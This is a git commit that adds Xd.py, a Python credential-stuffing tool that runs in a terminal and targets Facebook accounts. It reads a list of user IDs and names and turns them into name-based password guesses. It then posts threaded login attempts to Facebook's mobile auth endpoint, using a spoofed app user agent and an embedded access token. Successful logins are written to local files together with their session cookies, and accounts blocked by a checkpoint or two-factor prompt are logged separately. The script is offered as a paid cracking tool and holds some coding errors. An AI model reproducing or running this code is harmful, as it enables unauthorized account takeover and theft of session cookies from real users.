7c8380c109337531097c8ae75330d7bda88c8668
XIYAD <118036348+Xiyad69@users.noreply.github.com>
2024-04-30 18:46:27 +0600

    Create Xd.py

---
+++ Xd.py
@@ -0,0 +1,258 @@
+# Coded BY 2024
+import os,zlib
+
+from os import system as osRUB
+from os import system as cmd
+os.system('clear')
+print('\033[92;1m>>\033[1;37m Installing missing modules ...')
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
+try:
+    import requests
+except ImportError:
+    print('\n\033[92;1m>>\033[1;37m Installing requests !...\n')
+    os.system('pip install requests')
+    
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n\033[92;1m>>\033[1;37m Installing futures !...\n')
+    os.system('pip install futures')
+
+
+    time.sleep(1.5)
+    os.system('git pull')
+
+    os.system('pkg install curl')
+try:
+    import requests 
+except ImportError:
+    print('\n\033[92;1m>>\033[1;37m Installing Requests ...\n')
+    os.system('pip install requests')
+
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n\033[92;1m>>\033[1;37m Installing futures ...\n')
+    os.system('pip install futures')
+
+try:
+    import mechanize
+except ModuleNotFoundError:
+    os.system('pip install mechanize > /dev/null')
+
+from urllib.request import Request, urlopen
+import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
+from concurrent.futures import ThreadPoolExecutor as XiyadXiyad
+from string import * 
+from random import randint
+from time import sleep as slp
+from os import system as cmd
+from zlib import decompress 
+import os, platform
+
+from concurrent.futures import ThreadPoolExecutor
+fast_work = ThreadPoolExecutor(max_workers=15).submit
+
+
+oks = []
+cps = []
+plist = []
+methods = []
+speed = []
+twf = []
+loop = 0
+
+
+logo = """\033[1;37m
+    
+ db    db d888888b db    db  .d8b.  d8888b.  \033[92;1mX \033[1;37m
+ `8b  d8'   `88'   `8b  d8' d8' `8b 88  `8D  \033[1;37mI \033[1;37m
+  `8bd8'     88     `8bd8'  88ooo88 88   88  \033[92;1mY \033[1;37m
+  .dPYb.     88       88    88~~~88 88   88  \033[1;37mA \033[1;37m
+ .8P  Y8.   .88.      88    88   88 88  .8D  \033[92;1mD\033[1;37m
+ YP    YP Y888888P    YP    YP   YP Y8888D' \033[91;1mPRO\033[1;37m
+\033[1;37m------------------------------------------------
+\033[92;1m>>  \033[1;37mOwner        \033[1;32m :  \033[92;1mX \033[1;37mI \033[92;1mY \033[1;37mA \033[92;1mD
+\033[92;1m>>  \033[1;37mFacebook     \033[1;32m :\033[1;97m  Riyad Mahfuz
+\033[92;1m>>  \033[1;37mDeveloper    \033[1;32m :\033[1;97m  Riyad
+\033[92;1m>>  \033[1;37mGithub       \033[1;32m :\033[1;97m  XIYAD
+\033[92;1m>>  \033[1;37mTool Type    \033[1;32m :\033[1;97m  \033[91;1mPAID
+\033[92;1m>>  \033[1;37mVersion      \033[1;32m :\033[1;97m  \033[92;1m14.05
+\33[1;37m-------------------------------------------------"""
+def linex():
+        print(f"\33[1;37m-------------------------------------------------""")
+def clear():
+        os.system('clear')
+        print(logo)
+
+def menu():
+    os.system('clear')
+    print(logo)
+    print('\033[92;1m[\033[1;37m1\033[92;1m] \033[1;37mFILE CRACK')
+    print('\033[92;1m[\033[1;37m2\033[92;1m] \033[1;37mADMIN CONTACT ')
+    linex()
+    lomda = input('\033[92;1m>>\033[1;37m Choice :\033[92;1m ')
+    os.system('xdg-open https://chat.whatsapp.com/BbnGtyHZcmZ3F8bDnwwFlG')
+    if lomda in ['2']:
+    	os.system('xdg-open https://chat.whatsapp.com/BbnGtyHZcmZ3F8bDnwwFlG');Xiyad()
+    
+    if lomda in ['1']:
+        clear()
+        print('\033[92;1m>> \033[1;37mPut file example:\033[92;1m /sdcard/File.txt  etc..')
+        linex()
+        file = input('\033[92;1m>> \033[1;37mPut file path:\033[92;1m ')
+        try:
+            fo = open(file,'r').read().splitlines()
+        except FileNotFoundError:
+            print('FILE NOT FOUND ')
+            time.sleep(2)
+            Xiyad()
+        clear()
+        print('\033[92;1m[\033[1;37m1\033[92;1m] \033[1;37mMETHOD\033[92;1m [\033[1;37mFAST\033[92;1m] ')
+       
+        linex()
+        mthd=input('\033[92;1m>>\033[1;37m Choice :\033[92;1m ')
+        
+        linex()
+        clear()
+        plist = []
+        try:
+            ps_limit = int(input('\033[92;1m>> \033[1;37mHow many passwords do you want to add \033[91;1m?\033[92;1m '))
+        except:
+            ps_limit =1
+        linex()
+        clear()
+        print('\033[92;1m>> \033[1;37mEXAMPLE :\033[92;1mfirst last,first123,First@123…\033[1;37mEtc')
+        linex()
+        for i in range(ps_limit):
+            plist.append(input(f'\033[92;1m>> \033[1;37mpassword {i+1}:\033[92;1m '))
+        linex()
+        clear()
+        with XiyadXiyad(max_workers=30) as crack_submit:
+            clear()
+            total_ids = str(len(fo))
+            print(f'\033[92;1m>> \033[1;37m Total IDs     :\033[92;1m '+total_ids+f' ')
+            print(f'\033[92;1m>> \033[1;97m METHOD        :\033[92;1m M \x1b[91;1m{mthd}')
+            print(f'\033[92;1m>> \033[1;37m FILE NAME     :\033[1;32m {file} \033[1;37m')
+            print(f"\033[92;1m>> \33[1;97m Every 5 Min Turn Airplane\x1b[91;1m > On/Off\33[1;37m")
+            linex()
+            for user in fo:
+                ids,names = user.split('|')
+                passlist = plist
+                if mthd in ['1','01']:
+                    crack_submit.submit(ffb1,ids,names,passlist)
+                elif mthd in ['2','02']:
+                    crack_submit.submit(ffb2,ids,names,passlist)
+                elif mthd in ['3','03']:
+                    crack_submit.submit(ffb3,ids,names,passlist)
+        print('\033[1;37m')
+        linex()
+        print('\033[92;1m>>\033[1;37m THE PROCESS HAS COMPLETED')
+        print('\033[92;1m>>\033[1;37m TOTAL \033[92;1mOK \033[1;37m :  \033[92;1m'+str(len(oks)))
+        print('\033[92;1m>>\033[1;37m TOTAL \033[91;1mCP \033[1;37m :  \033[91;1m'+str(len(cps)))
+        linex()
+        input('\033[92;1m>>\033[1;37m PRESS RUN TO BACK ')
+        os.system('python Xiyad.py')
+    elif lomda in ['2']:
+            os.system('https://chat.whatsapp.com/IjLRadygoVqD0CO9sTBvIY')
+    else:
+        Xiyad()
+
+#ua
+
+model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
+
+
+    
+def sexxy():
+    xuna = 'Dalvik/2.1.0 (Linux; U; Android 10; S20+ Build/QP1A.782884.704) [FBAN/FB4A;FBAV/354.0.0.22.110;FBBV/350972581;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/352533088;FBCR/Banglalink;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2015;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
+    return xuna 
+    
+   
+def m1XD():
+    END = '[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=3.825,width=1440,height=2696};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-DE72;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua   
+
+
+
+def ffb1(ids,names,passlist):
+        try:
+                global oks,cps,loop
+                sys.stdout.write(f"\r \033[92;1mX\033[1;37mI\033[92;1mY\033[1;37mA\033[92;1mD \033[1;37m\x1b[1;94m{loop} \033[1;37m>> \033[1;32mOK \033[1;37m>>\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m>>\033[1;91m {len(cps)}");sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/50.0.0.3037;FBBV/17682435;[FBAN/FB4A;FBAV/196.0.0.17;FBBV/916390425;FBDM/{density=1.0,width=720,height=1280};FBLC/fr_FR;FBRV/978822854;FBCR/Movil GSM;FBMF/ARCHOS;FBBD/ARCHOS;FBPN/com.facebook.katana;FBDV/Archos Oxygen 101S ARDOIZ;FBSV/7.3.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]' [FBAN/FB4A;FBAV/61.0.0.2957;FBBV/11131194;[FBAN/FB4A;FBAV/196.0.0.17;FBBV/916390425;FBDM/{density=1.0,width=720,height=1280};FBLC/fr_FR;FBRV/978822854;FBCR/Movil GSM;FBMF/ARCHOS;FBBD/ARCHOS;FBPN/com.facebook.katana;FBDV/Archos Oxygen 101S ARDOIZ;FBSV/7.3.5;FBOP/1;FBCA/armeabi-v7a:armeabi:;]"
+                        head = {'User-Agent': sexxy(),
+                                'Accept-Encoding': 'gzip, deflate',
+                                'Connection': 'Keep-Alive',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'Host': 'graph.facebook.com',
+                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                                'X-FB-Connection-Type': 'MOBILE.LTE',
+                                'X-Tigon-Is-Retry': 'False',
+                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                                'x-fb-device-group': '5120',
+                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                                'X-FB-Request-Analytics-Tags': 'graphservice',
+                                'X-FB-HTTP-Engine': 'Liger',
+                                'X-FB-Client-IP': 'True',
+                                'X-FB-Server-Cluster': 'True',
+                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        data = {'adid':str(uuid.uuid4()),
+                                'format':'json',
+                                'device_id':str(uuid.uuid4()),
+                                'email':ids,'password':pas,
+                                'generate_analytics_claims':'1',
+                                'community_id':'',
+                                'cpl':'true',
+                                'try_num':'1',
+                                'family_device_id':str(uuid.uuid4()),
+                                'credentials_type':'password',
+                                'source':'login',
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'currently_logged_in_userid':'0',
+                                'locale': 'en_SV','client_country_code': 'SV',
+                                'fb_api_req_friendly_name':'authenticate',
+                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
+                                'access_token':accees_token}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=head).json()
+                        if 'session_key' in po:
+                                        print('\r\033[1;32m [XD]-[OK] '+ids+' | '+pas+'\033[1;97m')
+                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                                        open('/sdcard/ok_id.txt','a').write(ids+'|'+pas+'|'+ckkk+'\n')
+                                 
+                                        oks.append(ids)
+                                        break
+                        elif twf in str(po):
+                                                print('\r\033[1;34m [XD]-[2F] '+ids+' | '+pas)
+                                                open('/sdcard/XIYAD/2F..txt','a').write(ids+'|'+pas+'\n')
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                                #print('\r\033[91;1m [XD]-[CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/XIYAD/FILE-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                time.sleep(20)
+
+menu()
